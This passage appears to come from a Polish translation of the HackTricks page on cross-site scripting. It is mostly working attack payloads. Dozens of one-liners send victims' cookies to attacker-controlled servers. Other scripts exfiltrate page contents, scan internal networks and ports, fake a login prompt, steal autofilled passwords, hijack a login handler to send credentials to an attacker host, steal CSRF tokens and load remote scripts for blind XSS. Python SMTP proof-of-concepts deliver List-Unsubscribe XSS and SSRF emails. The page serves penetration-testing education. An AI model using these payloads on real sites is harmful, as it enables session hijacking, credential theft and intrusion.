ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS common payloads

### Kilka payloadów w 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Spraw, by użytkownik nawigował po stronie bez opuszczania iframe i przechwyć jego akcje (w tym dane wysyłane w formularzach):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Pobierz Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> Nie będziesz w stanie uzyskać dostępu do cookies z JavaScriptu, jeśli flaga HTTPOnly jest ustawiona w cookie. Ale tutaj masz [kilka sposobów obejścia tej ochrony](../hacking-with-cookies/index.html#httponly), jeśli masz szczęście.

### Wykradanie zawartości strony
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Znajdź wewnętrzne adresy IP
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Krótki czas oznacza odpowiadający port_ _Dłuższy czas oznacza brak odpowiedzi._

Sprawdź listę portów zablokowanych w Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) i w Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Pole do żądania danych logowania
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Przechwytywanie haseł z autouzupełniania
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
When any data is introduced in the password field, the username and password is sent to the attackers server, even if the client selects a saved password and don't write anything the credentials will be ex-filtrated.

### Przejmowanie handlerów formularzy w celu exfiltrate credentials (const shadowing)

Jeśli krytyczny handler (np. `function DoLogin(){...}`) zostanie zadeklarowany później na stronie, a twój payload uruchamia się wcześniej (np. via an inline JS-in-JS sink), zdefiniuj najpierw `const` o tej samej nazwie, aby przejąć i zablokować handler. Późniejsze deklaracje funkcji nie mogą ponownie powiązać nazwy `const`, pozostawiając twój hook pod kontrolą:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Notatki
- Opiera się to na kolejności wykonywania: twoja injection musi zostać wykonana przed prawidłową deklaracją.
- Jeśli twój payload jest opakowany w `eval(...)`, wiązania `const/let` nie staną się globalne. Użyj dynamicznej techniki `<script>` injection z sekcji “Deliverable payloads with eval(atob()) and scope nuances”, aby zapewnić prawdziwe globalne wiązanie, którego nie można ponownie przypisać.
- Gdy filtry słów kluczowych blokują kod, połącz to z Unicode-escaped identifiers lub dostawą przez `eval(atob('...'))`, jak pokazano wyżej.

### Keylogger

Szukając na githubie znalazłem kilka różnych:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Możesz też użyć metasploit `http_javascript_keylogger`

### Kradzież CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Kradzież wiadomości PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Wykorzystywanie Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Dostęp do Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Możesz także skorzystać z: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Dostęp do ukrytej zawartości

Z [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) można się dowiedzieć, że nawet jeśli niektóre wartości znikają z JS, wciąż można je znaleźć w atrybutach JS w różnych obiektach. Na przykład pole input dla REGEX nadal można odnaleźć po usunięciu jego wartości:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Lista Brute-Force


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS — wykorzystywanie innych podatności

### XSS w Markdown

Czy można wstrzyknąć kod Markdown, który zostanie wyrenderowany? Może uda ci się uzyskać XSS! Sprawdź:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS do SSRF

Masz XSS na **stronie, która korzysta z cache'owania**? Spróbuj **przekształcić to w SSRF** przez Edge Side Include Injection, używając tego payloadu:
```python
<esi:include src="http://yoursite.com/capture" />
```
Use it to bypass cookie restrictions, XSS filters and much more!\
More information about this technique here: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS w dynamicznie tworzonym pliku PDF

Jeśli strona WWW tworzy PDF używając danych kontrolowanych przez użytkownika, możesz spróbować **oszukać bota**, który tworzy PDF, aby **wykonał dowolny kod JS**.\
Więc jeśli **bot tworzący PDF znajdzie** jakiś rodzaj **tagów HTML**, zacznie je **interpretować**, i możesz to **wykorzystać**, by spowodować **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Jeśli nie możesz wstrzyknąć tagów HTML, warto spróbować **wstrzyknąć dane PDF**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS w Amp4Email

AMP, mający na celu przyspieszenie wydajności stron na urządzeniach mobilnych, wykorzystuje tagi HTML uzupełnione JavaScript, aby zapewnić funkcjonalność z naciskiem na szybkość i bezpieczeństwo. Obsługuje szereg komponentów dla różnych funkcji, dostępnych przez [AMP components](https://amp.dev/documentation/components/?format=websites).

The [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) format extends specific AMP components to emails, enabling recipients to interact with content directly within their emails.

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

The RFC 2369 `List-Unsubscribe` header embeds attacker-controlled URIs that many webmail and mail clients automatically convert into "Unsubscribe" buttons. When those URIs are rendered or fetched without validation, the header becomes an injection point for both stored XSS (if the unsubscribe link is placed in the DOM) and SSRF (if the server performs the unsubscribe request on behalf of the user).

#### Stored XSS via `javascript:` URIs

1. **Wyślij sobie e-mail** gdzie nagłówek wskazuje na URI `javascript:`, jednocześnie utrzymując resztę wiadomości nieszkodliwą, żeby filtry antyspamowe jej nie odrzuciły.
2. **Upewnij się, że UI renderuje wartość** (wiele klientów pokazuje ją w panelu "List Info") i sprawdź, czy wynikowy `<a>` tag dziedziczy atrybuty kontrolowane przez atakującego, takie jak `href` lub `target`.
3. **Wywołaj wykonanie** (np. CTRL+click, klik środkowym przyciskiem myszy, lub "open in new tab") gdy link używa `target="_blank"`; przeglądarki wykonają dostarczony JavaScript w origin aplikacji webmail.
4. Zaobserwuj prymityw stored-XSS: payload utrzymuje się razem z e-mailem i wymaga tylko kliknięcia, by się wykonać.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Bajt znaku nowej linii (`%0a`) w URI pokazuje, że nawet nietypowe znaki przetrwają proces renderowania w podatnych klientach takich jak Horde IMP H5, które wyświetlą ciąg dosłownie wewnątrz znacznika <a>.

<details>
<summary>Minimalny SMTP PoC, który dostarcza złośliwy nagłówek List-Unsubscribe</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Proxy wypisywania po stronie serwera -> SSRF

Niektóre klienty, takie jak Nextcloud Mail app, pośredniczą przy akcji unsubscribe po stronie serwera: kliknięcie przycisku powoduje, że serwer sam pobiera przekazany URL. To zamienia nagłówek w prymityw SSRF, szczególnie gdy administratorzy ustawiają `'allow_local_remote_servers' => true` (opisane w [HackerOne report 2902856](https://hackerone.com/reports/2902856)), co pozwala na żądania do loopback i zakresów RFC1918.

1. **Skomponuj wiadomość e-mail** gdzie `List-Unsubscribe` wskazuje na endpoint kontrolowany przez atakującego (do blind SSRF użyj Burp Collaborator / OAST).
2. **Zachowaj `List-Unsubscribe-Post: List-Unsubscribe=One-Click`** tak, aby UI pokazywał przycisk wypisania jednym kliknięciem.
3. **Spełnij wymagania zaufania**: Nextcloud, na przykład, wykonuje żądania HTTPS wypisania tylko wtedy, gdy wiadomość przejdzie DKIM, więc atakujący musi podpisać e-mail używając domeny, którą kontroluje.
4. **Dostarcz wiadomość do skrzynki przetwarzanej przez docelowy serwer** i poczekaj, aż użytkownik kliknie przycisk wypisania.
5. **Obserwuj callback po stronie serwera** na collaborator endpoint, a następnie pivotuj do adresów wewnętrznych, gdy prymityw zostanie potwierdzony.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>DKIM-signed List-Unsubscribe wiadomość do testów SSRF</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Notatki testowe**

- Użyj endpointu OAST, aby zebrać blind SSRF hits, a następnie dostosuj URL `List-Unsubscribe`, aby celował w `http://127.0.0.1:PORT`, metadata services lub inne hosty wewnętrzne po potwierdzeniu primitive.
- Ponieważ unsubscribe helper często ponownie wykorzystuje ten sam HTTP stack co aplikacja, dziedziczysz jego proxy settings, HTTP verbs i header rewrites, co umożliwia dalsze traversal tricks opisane w [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS przesyłanie plików (svg)

Prześlij jako obraz plik podobny do poniższego (z [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Znajdź **więcej SVG payloads na** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Różne triki JS i istotne informacje


{{#ref}}
other-js-tricks.md
{{#endref}}

## Zasoby XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Referencje

- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
